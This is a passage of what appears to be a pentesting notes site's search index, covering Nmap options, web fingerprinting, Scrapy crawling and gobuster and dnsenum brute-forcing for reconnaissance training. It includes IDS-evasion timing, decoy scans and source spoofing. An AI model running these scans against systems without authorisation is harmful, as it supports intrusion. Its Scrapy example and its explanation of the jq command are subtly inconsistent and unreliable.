for 10.129.2.28\nHost is up (0.013s latency).\n\nPORT      STATE SERVICE\n50000/tcp open  ibm-db2\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.08 seconds\n</code></pre>","tags":["Pentesting","Information_Gathering","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/Host%20Discovery/","title":"Host Discovery","text":"SWITCH EXAMPLE **DESCRIPTION**** -sL nmap 192.168.1.1-3 -sL No Scan. List targets only -sn nmap 192.168.1.1/24 -sn Disable port scanning. Host discovery only. -Pn nmap 192.168.1.1-5 -Pn Disable host discovery. Port scan only. -PS nmap 192.168.1.1-5 -PS22-25,80 TCP SYN discovery on port x.  Port 80 by default -PA nmap 192.168.1.1-5 -PA22-25,80 TCP ACK discovery on port x.  Port 80 by default -PU nmap 192.168.1.1-5 -PU53 UDP discovery on port x.  Port 40125 by default -PR nmap 192.168.1.1-1/24 -PR ARP discovery on local network -n nmap 192.168.1.1 -n Never do DNS resolution","tags":["Pentesting","Information_Gathering","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/Nmap%20Cheat%20Sheet/","title":"Nmap Cheat Sheet","text":"","tags":["Pentesting","Information_Gathering","Cheat_Sheet","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/Nmap%20Cheat%20Sheet/#scanning-options","title":"Scanning Options","text":"Nmap Option Description <code>10.10.10.0/24</code> Target network range. <code>-sn</code> Disables port scanning. <code>-Pn</code> Disables ICMP Echo Requests <code>-n</code> Disables DNS Resolution. <code>-PE</code> Performs the ping scan by using ICMP Echo Requests against the target. <code>--packet-trace</code> Shows all packets sent and received. <code>--reason</code> Displays the reason for a specific result. <code>--disable-arp-ping</code> Disables ARP Ping Requests. <code>--top-ports=&lt;num&gt;</code> Scans the specified top ports that have been defined as most frequent. <code>-p-</code> Scan all ports. <code>-p22-110</code> Scan all ports between 22 and 110. <code>-p22,25</code> Scans only the specified ports 22 and 25. <code>-F</code> Scans top 100 ports. <code>-sS</code> Performs an TCP SYN-Scan. <code>-sA</code> Performs an TCP ACK-Scan. <code>-sU</code> Performs an UDP Scan. <code>-sV</code> Scans the discovered services for their versions. <code>-sC</code> Perform a Script Scan with scripts that are categorized as \"default\". <code>--script &lt;script&gt;</code> Performs a Script Scan by using the specified scripts. <code>-O</code> Performs an OS Detection Scan to determine the OS of the target. <code>-A</code> Performs OS Detection, Service Detection, and traceroute scans. <code>-D RND:5</code> Sets the number of random Decoys that will be used to scan the target. <code>-e</code> Specifies the network interface that is used for the scan. <code>-S 10.10.10.200</code> Specifies the source IP address for the scan. <code>-g</code> Specifies the source port for the scan. <code>--dns-server &lt;ns&gt;</code> DNS resolution is performed by using a specified name server.","tags":["Pentesting","Information_Gathering","Cheat_Sheet","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/Nmap%20Cheat%20Sheet/#output-options","title":"Output Options","text":"Nmap Option Description <code>-oA filename</code> Stores the results in all available formats starting with the name of \"filename\". <code>-oN filename</code> Stores the results in normal format with the name \"filename\". <code>-oG filename</code> Stores the results in \"grepable\" format with the name of \"filename\". <code>-oX filename</code> Stores the results in XML format with the name of \"filename\".","tags":["Pentesting","Information_Gathering","Cheat_Sheet","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/Nmap%20Cheat%20Sheet/#performance-options","title":"Performance Options","text":"Nmap Option Description <code>--max-retries &lt;num&gt;</code> Sets the number of retries for scans of specific ports. <code>--stats-every=5s</code> Displays scan's status every 5 seconds. <code>-v/-vv</code> Displays verbose output during the scan. <code>--initial-rtt-timeout 50ms</code> Sets the specified time value as initial RTT timeout. <code>--max-rtt-timeout 100ms</code> Sets the specified time value as maximum RTT timeout. <code>--min-rate 300</code> Sets the number of packets that will be sent simultaneously. <code>-T &lt;0-5&gt;</code> Specifies the specific timing template.","tags":["Pentesting","Information_Gathering","Cheat_Sheet","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/OS%20Detection/","title":"OS Detection","text":"SWITCH EXAMPLE **DESCRIPTION**** -O nmap 192.168.1.1 -O Remote OS detection\u00a0using TCP/IP stack fingerprinting -O -osscan-limit nmap 192.168.1.1 -O -osscan-limit If at least one open and one closed TCP port are not found it will not try OS detection against host -O -osscan-guess nmap 192.168.1.1 -O -osscan-guess Makes Nmap guess more aggressively -O -max-os-tries nmap 192.168.1.1 -O -max-os-tries 1 Set the maximum number x of OS detection tries against a target -A nmap 192.168.1.1 -A Enables OS detection, version detection, script scanning, and traceroute","tags":["Pentesting","Information_Gathering","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/Options/","title":"Options","text":"","tags":["Pentesting","Information_Gathering","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/Options/#scanning-options","title":"Scanning Options","text":"Scanning Options Description <code>-sn</code> Disables port scanning <code>-Pn</code> Disables ICMP Echo Requests <code>-n</code> Disables ICMP Echo Requests <code>-PE</code> Performs the ping scan by using ICMP Echo Requests against the target. <code>--packet-trace</code> Shows all packets sent and received. <code>--reason</code> Displays the reason for a specific result. <code>--disable-arp- ping</code> Disables ARP Ping Requests. <code>--top-ports= &lt;num&gt;</code> Scans the specified top ports that have been defined as most frequent. <code>-p</code> Scan all ports. <code>-p22-110</code> Scan all ports between 22 and 110. <code>--stats-every=5s</code> Shows the progress of the scan every 5 seconds. <code>-v</code> Increases the verbosity of the scan, which displays more detailed information.","tags":["Pentesting","Information_Gathering","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/Options/#nmap-scan-techniques","title":"Nmap Scan\u00a0Techniques","text":"SWITCH EXAMPLE **DESCRIPTION**** -sS nmap 192.168.1.1 -sS TCP SYN port scan (Default) -sT nmap 192.168.1.1 -sT TCP connect port scan (Default without root privilege) -sU nmap 192.168.1.1 -sU UDP port scan -sA nmap 192.168.1.1 -sA TCP ACK port scan -sW nmap 192.168.1.1 -sW TCP Window port scan -sM nmap 192.168.1.1 -sM TCP Maimon port scan","tags":["Pentesting","Information_Gathering","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/Options/#target-specification","title":"Target Specification","text":"SWITCH EXAMPLE **DESCRIPTION**** nmap 192.168.1.1 Scan a single IP nmap 192.168.1.1 192.168.2.1 Scan specific IPs nmap 192.168.1.1-254 Scan a range nmap scanme.nmap.org Scan a domain nmap 192.168.1.0/24 Scan using CIDR notation -iL nmap -iL targets.txt Scan targets from a file -iR nmap -iR 100 Scan 100 random hosts -exclude nmap -exclude 192.168.1.1 Exclude listed hosts ## Scan Network Range Scanning Options Description <code>10.129.2.0/24</code> Target network range. <code>-sn</code> Disables port scanning. <code>-oA tnet</code> Stores the results in all formats starting with the name 'tnet'.","tags":["Pentesting","Information_Gathering","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/Port%20Scanning/","title":"Port Scanning","text":"SWITCH EXAMPLE **DESCRIPTION**** -p nmap 192.168.1.1 -p 21 Port scan for port x -p nmap 192.168.1.1 -p 21-100 Port range -p nmap 192.168.1.1 -p U:53,T:21-25,80 Port scan multiple TCP and UDP ports -p nmap 192.168.1.1 -p- Port scan all ports -p nmap 192.168.1.1 -p http,https Port scan from service name -F nmap 192.168.1.1 -F Fast port scan (100 ports) -top-ports nmap 192.168.1.1 -top-ports 2000 Port scan the top x ports -p-65535 nmap 192.168.1.1 -p-65535 Leaving off initial port in range makes the scan start at port 1 -p0- nmap 192.168.1.1 -p0- Leaving off end port in range  makes the scan go through to port 65535","tags":["Pentesting","Information_Gathering","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/Saving%20Output/","title":"Saving Output","text":"SWITCH *EXAMPLE* *DESCRIPTION* -oN nmap 192.168.1.1 -oN normal.file Normal output to the file normal.file -oX nmap 192.168.1.1 -oX xml.file XML output to the file xml.file -oG nmap 192.168.1.1 -oG grep.file Grepable output to the file grep.file -oA nmap 192.168.1.1 -oA results Output in the three major formats at once -oG - nmap 192.168.1.1 -oG - Grepable output to screen. -oN -, -oX - also usable -append-output nmap 192.168.1.1 -oN file.file -append-output Append a scan to a previous scan file -v nmap 192.168.1.1 -v Increase the verbosity level (use -vv or more for greater effect) -d nmap 192.168.1.1 -d Increase debugging level (use -dd or more for greater effect) -reason nmap 192.168.1.1 -reason Display the reason a port is in a particular state, same output as -vv -open nmap 192.168.1.1 -open Only show open (or possibly open) ports -packet-trace nmap 192.168.1.1 -T4 -packet-trace Show all packets sent and received -iflist nmap -iflist Shows the host interfaces and routes -resume nmap -resume results.file Resume a scan ## Helpful Nmap Output examples **COMMAND**** *DESCRIPTION* nmap -p80 -sV -oG - -open 192.168.1.1/24 | grep open Scan for web servers and grep to show which IPs are running web servers nmap -iR 10 -n -oX out.xml | grep \"Nmap\" | cut -d \" \" -f5 &gt; live-hosts.txt Generate a list of the IPs of live hosts nmap -iR 10 -n -oX out2.xml | grep \"Nmap\" | cut -d \" \" -f5 &gt;&gt; live-hosts.txt Append IP to the list of live hosts ndiff scanl.xml scan2.xml Compare output from nmap using the ndif xsltproc nmap.xml -o nmap.html Convert nmap xml files to html files grep \" open \" results.nmap | sed -r \u2018s/ +/ /g\u2019 | sort | uniq -c | sort -rn | less Reverse sorted list of how often ports turn up ## Style sheets <p>With the XML output, we can easily create HTML reports that are easy to read, even for non-technical people. This is later very useful for documentation, as it presents our results in a detailed and clear way. To convert the stored results from XML format to HTML, we can use the tool <code>xsltproc</code>.</p> <p>Saving the Results</p> <pre><code>arenwald@htb[/htb]$ xsltproc target.xml -o target.html\n</code></pre> <p>If we now open the HTML file in our browser, we see a clear and structured presentation of our results.</p>","tags":["Pentesting","Information_Gathering","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/Saving%20Output/#nmap-report","title":"Nmap Report","text":"<p>More information about the output formats can be found at: https://nmap.org/book/output.html</p>","tags":["Pentesting","Information_Gathering","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/Scripts/","title":"Scripts","text":"","tags":["Pentesting","Information_Gathering","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/Scripts/#nse-scripts","title":"NSE Scripts","text":"SWITCH *EXAMPLE* *DESCRIPTION* -sC nmap 192.168.1.1 -sC Scan with default NSE scripts. Considered useful for discovery and safe -script default nmap 192.168.1.1 -script default Scan with default NSE scripts. Considered useful for discovery and safe -script nmap 192.168.1.1 -script=banner Scan with a single script. Example banner -script nmap 192.168.1.1 -script=http* Scan with a wildcard. Example http -script nmap 192.168.1.1 -script=http,banner Scan with two scripts. Example http and banner -script nmap 192.168.1.1 -script \"not intrusive\" Scan default, but remove intrusive scripts -script-args nmap -script snmp-sysdescr -script-args snmpcommunity=admin 192.168.1.1 NSE script with arguments ## Useful NSE Script Examples **COMMAND**** *DESCRIPTION* nmap -Pn -script=http-sitemap-generator scanme.nmap.org http site map generator nmap -n -Pn -p 80 -open -sV -vvv -script banner,http-title -iR 1000 Fast search for random web servers nmap -Pn -script=dns-brute domain.com Brute forces DNS hostnames guessing subdomains nmap -n -Pn -vv -O -sV -script smb-enum,smb-ls,smb-mbenum,smb-os-discovery,smb-s,smb-vuln,smbv2 -vv 192.168.1.1 Safe SMB scripts to run nmap -script whois* domain.com Whois query nmap -p80 -script http-unsafe-output-escaping scanme.nmap.org Detect cross site scripting vulnerabilities nmap -p80 -script http-sql-injection scanme.nmap.org Check for SQL injections","tags":["Pentesting","Information_Gathering","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/Scripts/#categories","title":"Categories","text":"Category Description <code>auth</code> Determination of authentication credentials. <code>broadcast</code> Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans. <code>brute</code> Executes scripts that try to log in to the respective service by brute-forcing with credentials. <code>default</code> Default scripts executed by using the <code>-sC</code> option. <code>discovery</code> Evaluation of accessible services. <code>dos</code> These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services. <code>exploit</code> This category of scripts tries to exploit known vulnerabilities for the scanned port. <code>external</code> Scripts that use external services for further processing. <code>fuzzer</code> This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time. <code>intrusive</code> Intrusive scripts that could negatively affect the target system. <code>malware</code> Checks if some malware infects the target system. <code>safe</code> Defensive scripts that do not perform intrusive and destructive access. <code>version</code> Extension for service detection. <code>vuln</code> Identification of specific vulnerabilities.","tags":["Pentesting","Information_Gathering","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/Service%20and%20Version%20Detection/","title":"Service and Version Detection","text":"SWITCH EXAMPLE **DESCRIPTION**** -sV nmap 192.168.1.1 -sV Attempts to determine the version of the service running on port -sV -version-intensity nmap 192.168.1.1 -sV -version-intensity 8 Intensity level 0 to 9. Higher number increases possibility of correctness -sV -version-light nmap 192.168.1.1 -sV -version-light Enable light mode. Lower possibility of correctness. Faster -sV -version-all nmap 192.168.1.1 -sV -version-all Enable intensity level 9. Higher possibility of correctness. Slower -A nmap 192.168.1.1 -A Enables OS detection, version detection, script scanning, and traceroute","tags":["Pentesting","Information_Gathering","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/States/","title":"States","text":"State Description <code>open</code> This indicates that the connection to the scanned port has been established. These connections can be\u00a0TCP connections,\u00a0UDP datagrams\u00a0as well as\u00a0SCTP associations. <code>closed</code> When the port is shown as closed, the TCP protocol indicates that the packet we received back contains an\u00a0<code>RST</code>\u00a0flag. This scanning method can also be used to determine if our target is alive or not. <code>filtered</code> Nmap cannot correctly identify whether the scanned port is open or closed because either no response is returned from the target for the port or we get an error code from the target. <code>unfiltered</code> This state of a port only occurs during the\u00a0TCP-ACK\u00a0scan and means that the port is accessible, but it cannot be determined whether it is open or closed. <code>open\\|filtered</code> If we do not get a response for a specific port,\u00a0<code>Nmap</code>\u00a0will set it to that state. This indicates that a firewall or packet filter may protect the port. <code>closed\\|filtered</code> This state only occurs in the\u00a0IP ID idle\u00a0scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall.","tags":["Pentesting","Information_Gathering","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/Timing%20and%20Performance/","title":"Timing and Performance","text":"SWITCH EXAMPLE **DESCRIPTION**** -T0 nmap 192.168.1.1 -T0 Paranoid (0) Intrusion Detection System evasion -T1 nmap 192.168.1.1 -T1 Sneaky (1) Intrusion Detection System evasion -T2 nmap 192.168.1.1 -T2 Polite (2) slows down the scan to use less bandwidth and use less target machine resources -T3 nmap 192.168.1.1 -T3 Normal (3) which is default speed -T4 nmap 192.168.1.1 -T4 Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network -T5 nmap 192.168.1.1 -T5 Insane (5) speeds scan; assumes you are on an extraordinarily fast network ## Timing and Performance Switches SWITCH *EXAMPLE INPUT* *DESCRIPTION* -host-timeout\u00a0 1s; 4m; 2h Give up on target after this long -min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout\u00a0 1s; 4m; 2h Specifies probe round trip time -min-hostgroup/max-hostgroup\u00a0&lt;size 50; 1024 Parallel host scan group sizes -min-parallelism/max-parallelism\u00a0 10; 1 Probe parallelization -max-retries  3 Specify the maximum number of port scan probe retransmissions -min-rate\u00a0 100 Send packets no slower than\u00a0 per second -max-rate  100 Send packets no faster than\u00a0 per second","tags":["Pentesting","Information_Gathering","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/Timing%20and%20Performance/#examples","title":"Examples","text":"<pre><code>arenwald@htb[/htb]$ sudo nmap 10.129.2.0/24 -F --initial-rtt-timeout 50ms --max-rtt-timeout 100ms\n\n&lt;SNIP&gt;\nNmap done: 256 IP addresses (8 hosts up) scanned in 12.29 seconds\n</code></pre> Scanning Options Description <code>10.129.2.0/24</code> Scans the specified target network. <code>-F</code> Scans top 100 ports. <code>--initial-rtt-timeout 50ms</code> Sets the specified time value as initial RTT timeout. <code>--max-rtt-timeout 100ms</code> Sets the specified time value as maximum RTT timeout.","tags":["Pentesting","Information_Gathering","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Fingerprinting/","title":"Fingerprinting","text":""},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Fingerprinting/#fingerprinting-techniques","title":"Fingerprinting Techniques","text":"<p>There are several techniques used for web server and technology fingerprinting:</p> <ul> <li><code>Banner Grabbing</code>: Banner grabbing involves analysing the banners presented by web servers and other services. These banners often reveal the server software, version numbers, and other details.</li> <li><code>Analysing HTTP Headers</code>: HTTP headers transmitted with every web page request and response contain a wealth of information. The <code>Server</code> header typically discloses the web server software, while the <code>X-Powered-By</code> header might reveal additional technologies like scripting languages or frameworks.</li> <li><code>Probing for Specific Responses</code>: Sending specially crafted requests to the target can elicit unique responses that reveal specific technologies or versions. For example, certain error messages or behaviours are characteristic of particular web servers or software components.</li> <li><code>Analysing Page Content</code>: A web page's content, including its structure, scripts, and other elements, can often provide clues about the underlying technologies. There may be a copyright header that indicates specific software being used, for example.</li> </ul> <p>A variety of tools exist that automate the fingerprinting process, combining various techniques to identify web servers, operating systems, content management systems, and other technologies:</p> Tool Description Features <code>Wappalyzer</code> Browser extension and online service for website technology profiling. Identifies a wide range of web technologies, including CMSs, frameworks, analytics tools, and more. <code>BuiltWith</code> Web technology profiler that provides detailed reports on a website's technology stack. Offers both free and paid plans with varying levels of detail. <code>WhatWeb</code> Command-line tool for website fingerprinting. Uses a vast database of signatures to identify various web technologies. <code>Nmap</code> Versatile network scanner that can be used for various reconnaissance tasks, including service and OS fingerprinting. Can be used with scripts (NSE) to perform more specialised fingerprinting. <code>Netcraft</code> Offers a range of web security services, including website fingerprinting and security reporting. Provides detailed reports on a website's technology, hosting provider, and security posture. <code>wafw00f</code> Command-line tool specifically designed for identifying Web Application Firewalls (WAFs). Helps determine if a WAF is present and, if so, its type and configuration. <code>Nikto</code> <code>Nikto</code> is a powerful open-source web server scanner. In addition to its primary function as a vulnerability assessment tool. <code>Nikto's</code> fingerprinting capabilities provide insights into a website's technology stack."},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Active/Creepy%20Crawlies/","title":"Creepy Crawlies","text":""},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Active/Creepy%20Crawlies/#popular-web-crawlers","title":"Popular Web Crawlers","text":"<ol> <li><code>Burp Suite Spider</code>: Burp Suite, a widely used web application testing platform, includes a powerful active crawler called Spider. Spider excels at mapping out web applications, identifying hidden content, and uncovering potential vulnerabilities.</li> <li><code>OWASP ZAP (Zed Attack Proxy)</code>: ZAP is a free, open-source web application security scanner. It can be used in automated and manual modes and includes a spider component to crawl web applications and identify potential vulnerabilities.</li> <li><code>Scrapy (Python Framework)</code>: Scrapy is a versatile and scalable Python framework for building custom web crawlers. It provides rich features for extracting structured data from websites, handling complex crawling scenarios, and automating data processing. Its flexibility makes it ideal for tailored reconnaissance tasks.</li> <li><code>Apache Nutch (Scalable Crawler)</code>: Nutch is a highly extensible and scalable open-source web crawler written in Java. It's designed to handle massive crawls across the entire web or focus on specific domains. While it requires more technical expertise to set up and configure, its power and flexibility make it a valuable asset for large-scale reconnaissance projects.</li> </ol> <p>Adhering to ethical and responsible crawling practices is crucial no matter which tool you choose. Always obtain permission before crawling a website, especially if you plan to perform extensive or intrusive scans. Be mindful of the website's server resources and avoid overloading them with excessive requests.</p>"},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Active/Creepy%20Crawlies/#scrapy","title":"Scrapy","text":"<p>We will leverage Scrapy and a custom spider tailored for reconnaissance on <code>inlanefreight.com</code>. If you are interested in more information on crawling/spidering techniques, refer to the \"Using Web Proxies\" module, as it forms part of CBBH as well.</p> <p>Here's a basic Scrapy spider example to extract links from <code>example.com</code>:</p> <pre><code>import scrapy\n\nclass ExampleSpider(scrapy.Spider):\n    name = \"example\"\n    start_urls = ['http://example.com/']\n\n    def parse(self, response):\n        for link in response.css('a::attr(href)').getall():\n            if any(link.endswith(ext) for ext in self.interesting_extensions):\n                yield {\"file\": link}\n            elif not link.startswith(\"#\") and not link.startswith(\"mailto:\"):\n                yield response.follow(link, callback=self.parse)\n</code></pre> <p>After running the Scrapy spider, you'll have a file containing scraped data (e.g., <code>example_data.json</code>). You can analyze these results using standard command-line tools. For instance, to extract all links:</p> <pre><code>jq -r '.[] | select(.file != null) | .file' example_data.json | sort -u\n</code></pre> <p>This command uses <code>jq</code> to extract links, <code>awk</code> to isolate file extensions, <code>sort</code> to order them, and <code>uniq -c</code> to count their occurrences. By scrutinizing the extracted data, you can identify patterns, anomalies, or sensitive files that might be of interest for further investigation.</p>"},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Active/Creepy%20Crawlies/#installing-scrapy","title":"Installing Scrapy","text":"<p>Before we begin, ensure you have Scrapy installed on your system. If you don't, you can easily install it using pip, the Python package installer:</p> <p>Creepy Crawlies</p> <pre><code>arenwald@htb[/htb]$ pip3 install scrapy\n</code></pre> <p>This command will download and install Scrapy along with its dependencies, preparing your environment for building our spider.</p>"},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Active/Creepy%20Crawlies/#reconspider","title":"ReconSpider","text":"<p>First, run this command in your terminal to download the custom scrapy spider, <code>ReconSpider</code>, and extract it to the current working directory.</p> <pre><code>arenwald@htb[/htb]$ wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip\narenwald@htb[/htb]$ unzip ReconSpider.zip \n</code></pre> <p>With the files extracted, you can run <code>ReconSpider.py</code> using the following command:</p> <pre><code>arenwald@htb[/htb]$ python3 ReconSpider.py http://inlanefreight.com\n</code></pre> <p>Replace <code>inlanefreight.com</code> with the domain you want to spider. The spider will crawl the target and collect valuable information.</p>"},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Active/Creepy%20Crawlies/#resultsjson","title":"results.json","text":"<p>After running <code>ReconSpider.py</code>, the data will be saved in a JSON file, <code>results.json</code>. This file can be explored using any text editor. Below is the structure of the JSON file produced:</p> <pre><code>{\n    \"emails\": [\n        \"lily.floid@inlanefreight.com\",\n        \"cvs@inlanefreight.com\",\n        ...\n    ],\n    \"links\": [\n        \"https://www.themeansar.com\",\n        \"https://www.inlanefreight.com/index.php/offices/\",\n        ...\n    ],\n    \"external_files\": [\n        \"https://www.inlanefreight.com/wp-content/uploads/2020/09/goals.pdf\",\n        ...\n    ],\n    \"js_files\": [\n        \"https://www.inlanefreight.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2\",\n        ...\n    ],\n    \"form_fields\": [],\n    \"images\": [\n        \"https://www.inlanefreight.com/wp-content/uploads/2021/03/AboutUs_01-1024x810.png\",\n        ...\n    ],\n    \"videos\": [],\n    \"audio\": [],\n    \"comments\": [\n        \"&lt;!-- #masthead --&gt;\",\n        ...\n    ]\n}\n</code></pre> <p>Each key in the JSON file represents a different type of data extracted from the target website:</p> JSON Key Description <code>emails</code> Lists email addresses found on the domain. <code>links</code> Lists URLs of links found within the domain. <code>external_files</code> Lists URLs of external files such as PDFs. <code>js_files</code> Lists URLs of JavaScript files used by the website. <code>form_fields</code> Lists form fields found on the domain (empty in this example). <code>images</code> Lists URLs of images found on the domain. <code>videos</code> Lists URLs of videos found on the domain (empty in this example). <code>audio</code> Lists URLs of audio files found on the domain (empty in this example). <code>comments</code> Lists HTML comments found in the source code. <p>By exploring this JSON structure, you can gain valuable insights into the web application's architecture, content, and potential points of interest for further investigation.</p>"},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Active/Directory%20%26%20Page%20Fuzzing/","title":"Directory & Page Fuzzing","text":"<p>For efficient directory brute-forcing, start by using a wordlist for directories. Inside these directories, use wordlists for files.</p>","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Active/Directory%20%26%20Page%20Fuzzing/#tools","title":"Tools","text":"","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Active/Directory%20%26%20Page%20Fuzzing/#gobuster","title":"Gobuster","text":"<p><code>gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt</code></p>","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Active/Subdomain%20%26%20Virtual%20Host%20Fuzzing/","title":"Subdomain & Virtual Host Fuzzing","text":"","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Active/Subdomain%20%26%20Virtual%20Host%20Fuzzing/#subdomain-brute-forcing","title":"Subdomain Brute-Forcing","text":"<p>Subdomain brute-forcing is a proactive technique used in web reconnaissance to uncover subdomains that may not be readily apparent through passive methods. It involves systematically generating many potential subdomain names and testing them against the target's DNS server to see if they exist. This approach can unveil hidden subdomains that may host valuable information, development servers, or vulnerable applications.</p> <p>One of the most versatile tools for subdomain brute-forcing is <code>dnsenum</code>. This powerful command-line tool combines various DNS enumeration techniques, including dictionary-based brute-forcing, to uncover subdomains associated with your target.</p> <p>To use <code>dnsenum</code> for subdomain brute-forcing, you'll typically provide it with the target domain and a wordlist containing potential subdomain names. The tool will then systematically query the DNS server for each potential subdomain and report any that exist.</p> <p>For example, the following command would attempt to brute-force subdomains of <code>example.com</code> using a wordlist named <code>subdomains.txt</code>:</p> <pre><code>dnsenum example.com -f subdomains.txt\n</code></pre>","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Active/Subdomain%20%26%20Virtual%20Host%20Fuzzing/#virtual-hosts","title":"Virtual Hosts","text":"<p>Virtual hosting is a technique that allows multiple websites to share a single IP address. Each website is associated with a unique hostname, which is used to direct incoming requests to the correct site. This can be a cost-effective way for organizations to host multiple websites on a single server, but it can also create a challenge for web reconnaissance.</p> <p>Since multiple websites share the same IP address, simply scanning the IP won't reveal all the hosted sites. You need a tool that can test different hostnames against the IP address to see which ones respond.</p> <p>Several tools are available to aid in the discovery of virtual hosts:</p> Tool Description Features gobuster A multi-purpose tool often used for directory/file brute-forcing, but also effective for virtual host discovery. Fast, supports multiple HTTP methods, can use custom wordlists. Feroxbuster Similar to Gobuster, but with a Rust-based implementation, known for its speed and flexibility. Supports recursion, wildcard discovery, and various filters. ffuf Another fast web fuzzer that can be used for virtual host discovery by fuzzing the <code>Host</code> header. Customizable wordlist input and filtering options.","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Active/Subdomain%20%26%20Virtual%20Host%20Fuzzing/#gobuster","title":"Gobuster","text":"<p>Gobuster is a versatile tool that can be used for various types of brute-forcing, including virtual host discovery. Its <code>vhost</code> mode is designed to enumerate virtual hosts by sending requests to the target IP address with different hostnames. If a virtual host is configured for a specific hostname, Gobuster will receive a response from the web server.</p> <p>To use Gobuster to brute-force virtual hosts, you'll need a wordlist containing potential hostnames. Here's an example command:</p> <pre><code>gobuster vhost -u http://192.0.2.1 -w hostnames.txt\n</code></pre> <p>In this example, <code>-u</code> specifies the target IP address, and <code>-w</code> specifies the wordlist file. Gobuster will then systematically try each hostname in the wordlist and report any that results in a valid response from the web server.</p>","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Active/Subdomain%20%26%20Virtual%20Host%20Fuzzing/#subdomain","title":"Subdomain","text":"<p><code>gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt</code></p>","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Active/Subdomain%20%26%20Virtual%20Host%20Fuzzing/#vhosts","title":"Vhosts","text":"<p>The <code>gobuster</code> command to bruteforce vhosts generally looks like this:</p> <pre><code>arenwald@htb[/htb]$ gobuster vhost -u http://&lt;target_IP_address&gt; -w &lt;wordlist_file&gt; --append-domain\n</code></pre> <ul> <li>The <code>-u</code> flag specifies the target URL (replace <code>&lt;target_IP_address&gt;</code> with the actual IP).</li> <li>The <code>-w</code> flag specifies the wordlist file (replace <code>&lt;wordlist_file&gt;</code> with the path to your wordlist).</li> <li>The <code>--append-domain</code> flag appends the base domain to each word in the wordlist.</li> </ul>","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Active/Web%20Crawling%20%28Theory%29/","title":"Web Crawling (Theory)","text":"<p><code>Crawling</code>, often called <code>spidering</code>, is the <code>automated process of systematically browsing the World Wide Web</code>. Similar to how a spider navigates its web, a web crawler follows links from one page to another, collecting information. These crawlers are essentially bots that use pre-defined algorithms to discover and index web pages, making them accessible through search engines or for other purposes like data analysis and web 